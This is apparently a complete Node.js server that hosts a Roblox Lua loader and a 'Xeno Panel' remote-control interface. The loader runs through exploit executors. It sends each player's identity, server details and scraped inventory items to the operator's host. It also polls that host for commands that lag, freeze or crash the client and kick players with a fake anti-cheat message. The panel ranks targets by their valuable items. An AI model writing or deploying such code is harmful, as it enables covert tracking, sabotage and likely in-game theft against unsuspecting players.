const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// ─── YOUR DOMAIN ───
const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 'https://ligma-balls.up.railway.app';

app.use(cors({ origin: PUBLIC_URL, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// ─── SESSION STORE ───
const sessions = new Map();
const CORRECT_PASSWORD = 'imgayandimgabe';   // <-- UPDATED
const SESSION_TTL = 24 * 60 * 60 * 1000; // 24h
const COOKIE_NAME = 'xeno_sid';

function generateSessionId() {
    return crypto.randomBytes(32).toString('hex');
}

// ─── COOKIE PARSER ───
app.use((req, res, next) => {
    req.cookies = {};
    const cookieHeader = req.headers.cookie;
    if (cookieHeader) {
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.trim().split('=');
            if (name && rest.length) {
                req.cookies[name] = rest.join('=');
            }
        });
    }
    res.setCookie = (name, value, opts = {}) => {
        let cookie = `${name}=${value}; Path=/; HttpOnly; SameSite=Lax`;
        if (opts.maxAge) cookie += `; Max-Age=${opts.maxAge}`;
        if (opts.secure) cookie += '; Secure';
        res.setHeader('Set-Cookie', cookie);
    };
    res.clearCookie = (name) => {
        res.setHeader('Set-Cookie', `${name}=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT`);
    };
    next();
});

// ─── AUTH MIDDLEWARE ───
function requireSession(req, res, next) {
    const sid = req.cookies[COOKIE_NAME] || req.headers['x-session-id'];
    if (!sid || !sessions.has(sid)) {
        if (req.accepts('html')) return res.redirect('/login');
        return res.status(401).json({ error: 'Unauthorized' });
    }
    const session = sessions.get(sid);
    if (Date.now() - session.createdAt > SESSION_TTL) {
        sessions.delete(sid);
        res.clearCookie(COOKIE_NAME);
        if (req.accepts('html')) return res.redirect('/login');
        return res.status(401).json({ error: 'Session expired' });
    }
    session.createdAt = Date.now();
    sessions.set(sid, session);
    req.sessionId = sid;
    next();
}

// ─── PUBLIC ROUTES (no session) ───
app.get('/login', (req, res) => {
    const sid = req.cookies[COOKIE_NAME];
    if (sid && sessions.has(sid)) return res.redirect('/');
    res.send(`
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Xeno Panel – Login</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',sans-serif;background:#0b0d11;color:#e8edf5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.login-box{background:#12171f;border:1px solid #1f2937;border-radius:20px;padding:40px 36px 34px;max-width:400px;width:100%;text-align:center;box-shadow:0 24px 64px rgba(0,0,0,0.8)}.login-box .logo{font-size:28px;font-weight:700;background:linear-gradient(135deg,#a78bfa,#6366f1);-webkit-background-clip:text;-webkit-text-fill-color:transparent}.login-box .logo-sub{font-size:13px;color:#6b7a8f;background:#1a212b;padding:2px 14px;border-radius:20px;border:1px solid #26313f;display:inline-block;margin:8px 0 16px}.login-box .tagline{font-size:14px;color:#9aabb8;margin-bottom:24px}.login-box input{width:100%;padding:12px 16px;background:#0d1117;border:1px solid #1f2937;border-radius:30px;color:#e8edf5;font-size:15px;outline:none;transition:border .2s}.login-box input:focus{border-color:#6366f1}.login-box button{width:100%;padding:12px;border:none;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;background:linear-gradient(135deg,#6366f1,#818cf8);color:#fff;transition:transform .15s,box-shadow .2s;margin-top:12px}.login-box button:hover{transform:scale(1.01);box-shadow:0 4px 24px rgba(99,102,241,0.3)}.login-box .error{color:#f87171;font-size:13px;min-height:20px;margin-top:8px}.lock-icon{font-size:42px;display:block;margin-bottom:10px}</style>
</head>
<body>
<div class="login-box">
<span class="lock-icon">🔐</span>
<div class="logo">Xeno Panel</div>
<div class="logo-sub">v3 · secured</div>
<p class="tagline">Enter the access password to continue.</p>
<input type="password" id="password" placeholder="Enter password…" autofocus />
<button id="loginBtn">Unlock Panel</button>
<div class="error" id="error"></div>
</div>
<script>
document.getElementById('loginBtn').addEventListener('click', async () => {
    const pwd = document.getElementById('password').value.trim();
    const err = document.getElementById('error');
    if (!pwd) { err.textContent = 'Please enter the password.'; return; }
    try {
        const res = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({password:pwd}) });
        const data = await res.json();
        if (res.ok) { window.location.href = '/'; }
        else { err.textContent = data.error || 'Incorrect password.'; document.getElementById('password').value=''; document.getElementById('password').focus(); }
    } catch(e) { err.textContent = 'Network error. Try again.'; }
});
document.getElementById('password').addEventListener('keydown', (e) => { if (e.key==='Enter') document.getElementById('loginBtn').click(); });
</script>
</body>
</html>
    `);
});

app.post('/api/login', (req, res) => {
    const { password } = req.body;
    if (password === CORRECT_PASSWORD) {
        const sid = generateSessionId();
        sessions.set(sid, { createdAt: Date.now() });
        res.setCookie(COOKIE_NAME, sid, { maxAge: SESSION_TTL / 1000, secure: true });
        return res.json({ success: true });
    }
    res.status(401).json({ error: 'Invalid password' });
});

app.post('/api/logout', (req, res) => {
    const sid = req.cookies[COOKIE_NAME];
    if (sid) sessions.delete(sid);
    res.clearCookie(COOKIE_NAME);
    res.json({ success: true });
});

// ─── PLAYERS STORE ───
const players = new Map();

// ─── PUBLIC LOADER (full code) ───
app.get('/loader.lua', (req, res) => {
    const loader = `local BASE = "${PUBLIC_URL}"
local KEY  = "xenooooo"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local genv = (getgenv and getgenv()) or _G or {}
local function resolveRequest()
    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
end

local request = resolveRequest()
if not request then
    local deadline = tick() + 10
    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
end
if not request then return end

local LP = Players.LocalPlayer
if not LP then
    local deadline = tick() + 30
    repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
end
if not LP then return end

local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"

local function gameName()
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    return info and info.Name or "Unknown Game"
end

local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end

local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end
    
    local possibleGUIs = {
        "DuelsMachineSession",
        "DuelsMachine",
        "BrainrotUI",
        "BrainrotSession",
        "SessionGUI",
        "DuelsGUI"
    }
    
    local gui = nil
    for _, name in ipairs(possibleGUIs) do
        gui = safe(function() return pg:FindFirstChild(name) end)
        if gui then break end
    end
    if not gui then return list end
    
    local targetFrame = nil
    local function findFrame(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
                return child
            end
            local found = findFrame(child)
            if found then return found end
        end
        return nil
    end
    
    targetFrame = findFrame(gui)
    if not targetFrame then 
        targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
    end
    if not targetFrame then 
        for _, child in ipairs(gui:GetDescendants()) do
            if child:IsA("Frame") and #child:GetChildren() > 3 then
                targetFrame = child
                break
            end
        end
    end
    if not targetFrame then return list end
    
    local processedItems = {}
    local function processItem(item)
        if not item or not item:IsA("Instance") or processedItems[item] then return end
        processedItems[item] = true
        
        local title = nil
        local cash = nil
        
        for _, obj in ipairs(item:GetDescendants()) do
            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
                local text = obj.Text
                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
                        if not title or (#text > #title) then
                            title = text
                        end
                    end
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or 
                       (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
                        cash = text
                    end
                end
            end
        end
        
        if title or cash then
            if title and title ~= "" then
                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if cash and cash ~= "" then
                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
            end
            if title and string.match(title, "^%d+$") and not cash then
                return
            end
            table.insert(list, { 
                title = title and title ~= "" and title or "Unknown Item", 
                cash = cash and cash ~= "" and cash or "0" 
            })
        end
    end
    
    local function processAll(container)
        if not container then return end
        for _, child in ipairs(container:GetChildren()) do
            if child:IsA("Frame") and #child:GetChildren() > 0 then
                local hasText = false
                for _, desc in ipairs(child:GetDescendants()) do
                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
                        hasText = true
                        break
                    end
                end
                if hasText then
                    processItem(child)
                end
            end
            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
                processAll(child)
            end
        end
    end
    
    processAll(targetFrame)
    
    for _, child in ipairs(targetFrame:GetChildren()) do
        if child.Name == "Template" and child:IsA("Frame") then
            processItem(child)
        end
    end
    
    if #list == 0 then
        local simpleBrainrots = {}
        local seenTexts = {}
        for _, child in ipairs(pg:GetDescendants()) do
            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
                    seenTexts[text] = true
                    local cash = "0"
                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if text == "" then text = "Item" end
                    end
                    if #text > 1 then
                        table.insert(simpleBrainrots, { title = text, cash = cash })
                    end
                end
            end
        end
        if #simpleBrainrots > 0 then
            return simpleBrainrots
        end
    end
    
    return list
end

local function heartbeat()
    safe(function()
        local brainrots = collectBrainrots()
        local success, result = pcall(function()
            return request({
                Url = BASE .. "/api/public/heartbeat",
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                Body = HttpService:JSONEncode({
                    user_id = LP.UserId,
                    username = LP.Name,
                    display_name = LP.DisplayName,
                    avatar_url = avatarUrl(),
                    place_id = game.PlaceId,
                    game_name = gameName(),
                    job_id = game.JobId,
                    executor = executorName,
                    server_players = serverPlayers(),
                    brainrots = brainrots,
                }),
            })
        end)
        if not success then
            local simpleBrainrots = {}
            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
            if pg then
                for _, child in ipairs(pg:GetDescendants()) do
                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
                            table.insert(simpleBrainrots, { title = text, cash = "0" })
                        end
                    end
                end
            end
            if #simpleBrainrots > 0 then
                pcall(function()
                    request({
                        Url = BASE .. "/api/public/heartbeat",
                        Method = "POST",
                        Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
                        Body = HttpService:JSONEncode({
                            user_id = LP.UserId,
                            username = LP.Name,
                            display_name = LP.DisplayName,
                            avatar_url = avatarUrl(),
                            place_id = game.PlaceId,
                            game_name = gameName(),
                            job_id = game.JobId,
                            executor = executorName,
                            server_players = serverPlayers(),
                            brainrots = simpleBrainrots,
                        }),
                    })
                end)
            end
        end
    end)
end

local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17
local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do task.wait(0.05) end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then doRubberband() end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then
        isActive = true
        startLoop()
    else
        isActive = false
        stopLoop()
    end
end

local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false

local function poll()
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
    end)
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC
        prevLagN = wantN
        if wantC then
            setMode("carry")
        elseif wantN then
            setMode("normal")
        else
            setMode(nil)
        end
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

heartbeat()
poll()

task.spawn(function()
    while task.wait(3) do heartbeat() end
end)

task.spawn(function()
    while task.wait(0.5) do poll() end
end)`;
    res.setHeader('Content-Type', 'text/plain');
    res.send(loader);
});

// ─── PUBLIC PANEL (full code) ───
app.get('/panel.lua', (req, res) => {
    const panel = `local BASE_URL = "${PUBLIC_URL}"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local function getHttpFunc()
    local env = getgenv and getgenv() or _G
    return http_request
        or request
        or (syn and syn.request)
        or (http and http.request)
        or (fluxus and fluxus.request)
        or env.http_request
        or env.request
        or (env.syn and env.syn.request)
end

local http = getHttpFunc()
if not http then return end

local function apiGet(url)
    local ok, res = pcall(function()
        return http({ Url = url, Method = "GET", Headers = { ["Content-Type"] = "application/json" } })
    end)
    if ok and res and res.Body then return res.Body end
    return nil
end

local function apiPost(url, data)
    local ok, res = pcall(function()
        return http({
            Url = url,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(data),
        })
    end)
    if ok and res and res.Body then return res.Body end
    return nil
end

local function copyToClipboard(text)
    pcall(function()
        if setclipboard then setclipboard(text)
        elseif syn and syn.setclipboard then syn.setclipboard(text)
        elseif toclipboard then toclipboard(text)
        end
    end)
end

local guiParent
if gethui then
    local ok, r = pcall(gethui)
    if ok and r then guiParent = r end
end
guiParent = guiParent or CoreGui

for _, c in ipairs(guiParent:GetChildren()) do
    if c.Name == "XenoPanel" then pcall(c.Destroy, c) end
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "XenoPanel"
ScreenGui.ResetOnSpawn = false
ScreenGui.IgnoreGuiInset = true
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() if syn and syn.protect_gui then syn.protect_gui(ScreenGui) end end)
pcall(function() if protect_gui then protect_gui(ScreenGui) end end)
ScreenGui.Parent = guiParent

local Theme = {
    Bg     = Color3.fromRGB(0, 0, 0),
    Border = Color3.fromRGB(48, 38, 55),
    Orange = Color3.fromRGB(255, 140, 40),
    Red    = Color3.fromRGB(240, 80, 90),
    Green  = Color3.fromRGB(80, 220, 130),
    Gray   = Color3.fromRGB(100, 100, 120),
    Text   = Color3.fromRGB(245, 235, 245),
    Dim    = Color3.fromRGB(160, 145, 175),
    Blue   = Color3.fromRGB(70, 130, 255),
}

local function create(cn, props)
    local i = Instance.new(cn)
    for k, v in pairs(props) do i[k] = v end
    return i
end

local function corner(p, r)
    return create("UICorner", { CornerRadius = UDim.new(0, r), Parent = p })
end

local function stroke(p, c, t, tr)
    return create("UIStroke", {
        Color = c or Theme.Border,
        Thickness = t or 1,
        Transparency = tr or 0,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
        Parent = p,
    })
end

local isMobile = UserInputService.TouchEnabled
local FRAME = isMobile and { X = 280, Y = 380 } or { X = 460, Y = 540 }

local MainFrame = create("Frame", {
    Parent = ScreenGui,
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    Size = UDim2.new(0, FRAME.X, 0, FRAME.Y),
    BackgroundColor3 = Theme.Bg,
    BorderSizePixel = 0,
    ClipsDescendants = true,
})
corner(MainFrame, 12)
stroke(MainFrame, Theme.Border, 1, 0.3)

local StarContainer = create("Frame", {
    Parent = MainFrame,
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundTransparency = 1,
    ZIndex = 1,
})

local stars = {}
for i = 1, (isMobile and 22 or 38) do
    local sz = math.random(1, isMobile and 3 or 4)
    local star = create("Frame", {
        Parent = StarContainer,
        Size = UDim2.new(0, sz, 0, sz),
        Position = UDim2.new(math.random() * 0.95, 0, math.random(), 0),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BackgroundTransparency = math.random(30, 70) / 100,
        BorderSizePixel = 0,
        ZIndex = 2,
    })
    corner(star, sz)
    table.insert(stars, { ui = star, speed = math.random(30, 80) / 100, fall = 1 + math.random() * 0.5 })
end

task.spawn(function()
    while ScreenGui.Parent do
        for _, s in ipairs(stars) do
            local ny = s.ui.Position.Y.Scale + s.speed * 0.01
            if ny > 1 + s.fall then
                ny = -0.1
                s.ui.Position = UDim2.new(math.random() * 0.95, 0, ny, 0)
                s.ui.BackgroundTransparency = math.random(30, 70) / 100
            else
                s.ui.Position = UDim2.new(s.ui.Position.X.Scale, 0, ny, 0)
            end
        end
        task.wait(0.05)
    end
end)

task.spawn(function()
    local up, p = true, 0
    while ScreenGui.Parent do
        if up then
            p = p + 0.03
            if p >= 1 then up = false end
        else
            p = p - 0.03
            if p <= 0.3 then up = true end
        end
        local st = MainFrame:FindFirstChildOfClass("UIStroke")
        if st then st.Transparency = 0.3 + p * 0.4 end
        task.wait(0.05)
    end
end)

local Header = create("Frame", {
    Parent = MainFrame,
    Size = UDim2.new(1, 0, 0, isMobile and 38 or 44),
    BackgroundColor3 = Theme.Bg,
    BorderSizePixel = 0,
    ZIndex = 10,
})
corner(Header, 12)

local Title = create("TextLabel", {
    Parent = Header,
    BackgroundTransparency = 1,
    AnchorPoint = Vector2.new(0.5, 0.5),
    Position = UDim2.new(0.5, 0, 0.5, 0),
    Size = UDim2.new(0.7, 0, 1, 0),
    Text = "REMOTE CONTROL PANEL",
    TextColor3 = Theme.Text,
    TextSize = isMobile and 12 or 14,
    Font = Enum.Font.GothamBold,
    ZIndex = 12,
})

local CountLabel = create("TextLabel", {
    Parent = Header,
    BackgroundTransparency = 1,
    AnchorPoint = Vector2.new(0, 0.5),
    Position = UDim2.new(0, 12, 0.5, 0),
    Size = UDim2.new(0, 120, 1, 0),
    Text = "0/0",
    TextColor3 = Theme.Orange,
    TextSize = isMobile and 11 or 12,
    Font = Enum.Font.GothamBold,
    TextXAlignment = Enum.TextXAlignment.Left,
    ZIndex = 12,
})

local CloseBtn = create("TextButton", {
    Parent = Header,
    AnchorPoint = Vector2.new(1, 0.5),
    Position = UDim2.new(1, -10, 0.5, 0),
    Size = UDim2.new(0, isMobile and 22 or 26, 0, isMobile and 22 or 26),
    BackgroundColor3 = Theme.Bg,
    Text = "X",
    TextColor3 = Color3.fromRGB(200, 200, 200),
    TextSize = isMobile and 12 or 14,
    Font = Enum.Font.GothamBold,
    AutoButtonColor = false,
    ZIndex = 12,
})
corner(CloseBtn, 6)
stroke(CloseBtn, Theme.Border, 1, 0.3)

CloseBtn.MouseEnter:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {
        BackgroundColor3 = Theme.Red,
        TextColor3 = Color3.fromRGB(255, 255, 255),
    }):Play()
end)
CloseBtn.MouseLeave:Connect(function()
    TweenService:Create(CloseBtn, TweenInfo.new(0.15), {
        BackgroundColor3 = Theme.Bg,
        TextColor3 = Color3.fromRGB(200, 200, 200),
    }):Play()
end)
CloseBtn.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)

do
    local dragging, dragStart, startPos, dragInput = false, nil, nil, nil
    local function beginDrag(input)
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        dragInput = input
    end
    Header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            beginDrag(input)
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            local delta = input.Position - dragStart
            MainFrame.Position = UDim2.new(
                startPos.X.Scale, startPos.X.Offset + delta.X,
                startPos.Y.Scale, startPos.Y.Offset + delta.Y
            )
        end
    end)
    UserInputService.InputEnded:Connect(function(input)
        if input == dragInput then
            dragging = false
            dragInput = nil
        end
    end)
end

local SearchY = isMobile and 46 or 54
local SearchH = isMobile and 32 or 38

local SearchContainer = create("Frame", {
    Parent = MainFrame,
    Position = UDim2.new(0, 10, 0, SearchY),
    Size = UDim2.new(1, -20, 0, SearchH),
    BackgroundColor3 = Theme.Bg,
    BorderSizePixel = 0,
    ZIndex = 10,
})
corner(SearchContainer, 8)
stroke(SearchContainer, Theme.Border, 1, 0.3)

create("TextLabel", {
    Parent = SearchContainer,
    BackgroundTransparency = 1,
    Position = UDim2.new(0, 10, 0.5, 0),
    AnchorPoint = Vector2.new(0, 0.5),
    Size = UDim2.new(0, 18, 0, 18),
    Text = "🔍",
    TextColor3 = Theme.Dim,
    TextSize = isMobile and 12 or 14,
    Font = Enum.Font.Gotham,
    ZIndex = 11,
})

local SearchBox = create("TextBox", {
    Parent = SearchContainer,
    Position = UDim2.new(0, 34, 0, 0),
    Size = UDim2.new(1, -44, 1, 0),
    BackgroundTransparency = 1,
    PlaceholderText = "Search username, display, or brainrot...",
    Text = "",
    TextColor3 = Theme.Text,
    PlaceholderColor3 = Theme.Dim,
    TextSize = isMobile and 12 or 13,
    Font = Enum.Font.GothamMedium,
    TextXAlignment = Enum.TextXAlignment.Left,
    ClearTextOnFocus = false,
    ZIndex = 11,
})

local ListY = SearchY + SearchH + 8
local Results = create("ScrollingFrame", {
    Parent = MainFrame,
    Position = UDim2.new(0, 8, 0, ListY),
    Size = UDim2.new(1, -16, 1, -(ListY + 8)),
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    ScrollBarThickness = 3,
    ScrollBarImageColor3 = Theme.Orange,
    ScrollBarImageTransparency = 0.5,
    ZIndex = 5,
})

local PlayerContainer = create("Frame", {
    Parent = Results,
    Size = UDim2.new(1, 0, 0, 0),
    BackgroundTransparency = 1,
    AutomaticSize = Enum.AutomaticSize.Y,
})

local ListLayout = create("UIListLayout", {
    Parent = PlayerContainer,
    Padding = UDim.new(0, 6),
    SortOrder = Enum.SortOrder.LayoutOrder,
})

local EmptyLabel = create("TextLabel", {
    Parent = PlayerContainer,
    Size = UDim2.new(1, 0, 0, 60),
    BackgroundTransparency = 1,
    Text = "waiting for clients...",
    TextColor3 = Theme.Dim,
    TextSize = isMobile and 12 or 13,
    Font = Enum.Font.GothamMedium,
    LayoutOrder = -1,
    ZIndex = 5,
})

local function rowHeight()
    return isMobile and 132 or 116
end

local function makeChip(parent, label, color, x, w, onClick)
    local btn = create("TextButton", {
        Parent = parent,
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, x, 1, -22),
        Size = UDim2.new(0, w, 0, 24),
        BackgroundColor3 = Theme.Bg,
        AutoButtonColor = false,
        Text = label,
        TextColor3 = color,
        TextSize = 11,
        Font = Enum.Font.GothamBold,
        ZIndex = 7,
    })
    corner(btn, 6)
    stroke(btn, color, 1, 0.45)

    local active = false
    local function setActive(a)
        active = a
        TweenService:Create(btn, TweenInfo.new(0.12), {
            BackgroundColor3 = a and color or Theme.Bg,
            TextColor3 = a and Theme.Bg or color,
        }):Play()
    end

    btn.MouseButton1Click:Connect(function()
        onClick(not active, setActive)
    end)
    return setActive
end

local function makeOneShot(parent, label, color, x, w, onClick)
    local btn = create("TextButton", {
        Parent = parent,
        AnchorPoint = Vector2.new(0, 0.5),
        Position = UDim2.new(0, x, 1, -22),
        Size = UDim2.new(0, w, 0, 24),
        BackgroundColor3 = Theme.Bg,
        AutoButtonColor = false,
        Text = label,
        TextColor3 = color,
        TextSize = 11,
        Font = Enum.Font.GothamBold,
        ZIndex = 7,
    })
    corner(btn, 6)
    stroke(btn, color, 1, 0.45)

    btn.MouseEnter:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.12), {
            BackgroundColor3 = color,
            TextColor3 = Theme.Bg,
        }):Play()
    end)
    btn.MouseLeave:Connect(function()
        TweenService:Create(btn, TweenInfo.new(0.12), {
            BackgroundColor3 = Theme.Bg,
            TextColor3 = color,
        }):Play()
    end)
    btn.MouseButton1Click:Connect(onClick)
    return btn
end

local playersData = {}
local searchQuery = ""
local rowsByUser = {}

local function fetchPlayers()
    local body = apiGet(BASE_URL .. "/api/players")
    if not body then return false end
    local ok, json = pcall(HttpService.JSONDecode, HttpService, body)
    if ok and json and json.players then
        local newData = {}
        for _, p in ipairs(json.players) do
            newData[p.user_id] = p
        end
        playersData = newData
        return true
    end
    return false
end

local function sendCommand(userId, payload)
    apiPost(BASE_URL .. "/api/command", { user_id = userId, [payload[1]] = payload[2] })
end

local function sendFullState(userId, fps, lagC)
    apiPost(BASE_URL .. "/api/command", {
        user_id = userId,
        fps_limit = fps,
        lag_c = lagC,
    })
end

function renderPlayers()
    for _, child in ipairs(PlayerContainer:GetChildren()) do
        if child ~= EmptyLabel and child ~= ListLayout then
            child:Destroy()
        end
    end
    rowsByUser = {}

    local now = os.time() * 1000
    local onlineCount = 0
    local filtered = {}

    for id, data in pairs(playersData) do
        local online = (now - (data.lastHeartbeat or 0)) < 15000
        data.online = online
        if online then onlineCount = onlineCount + 1 end

        local q = searchQuery:lower()
        if q ~= "" then
            local nameMatch = data.username and data.username:lower():find(q)
            local displayMatch = data.display_name and data.display_name:lower():find(q)
            local brainrotMatch = false
            if data.brainrots then
                for _, b in ipairs(data.brainrots) do
                    if b.title and b.title:lower():find(q) then brainrotMatch = true; break end
                end
            end
            if not (nameMatch or displayMatch or brainrotMatch) then
                continue
            end
        end
        filtered[#filtered + 1] = data
    end

    table.sort(filtered, function(a, b)
        if a.online ~= b.online then
            return a.online
        end
        return (a.username or ""):lower() < (b.username or ""):lower()
    end)

    EmptyLabel.Visible = (#filtered == 0)
    CountLabel.Text = onlineCount .. "/" .. #playersData

    for _, client in ipairs(filtered) do
        local row = create("Frame", {
            Parent = PlayerContainer,
            Size = UDim2.new(1, -4, 0, rowHeight()),
            BackgroundColor3 = Theme.Bg,
            BorderSizePixel = 0,
            ClipsDescendants = true,
            ZIndex = 6,
        })
        corner(row, 10)
        stroke(row, Theme.Border, 1, 0.4)

        local dotColor = client.online and Theme.Green or Theme.Gray
        local dot = create("Frame", {
            Parent = row,
            Position = UDim2.new(0, 10, 0, 10),
            Size = UDim2.new(0, 8, 0, 8),
            BackgroundColor3 = dotColor,
            BorderSizePixel = 0,
            ZIndex = 7,
        })
        corner(dot, 8)

        local nameLbl = create("TextLabel", {
            Parent = row,
            Position = UDim2.new(0, 24, 0, 6),
            Size = UDim2.new(1, -34, 0, 16),
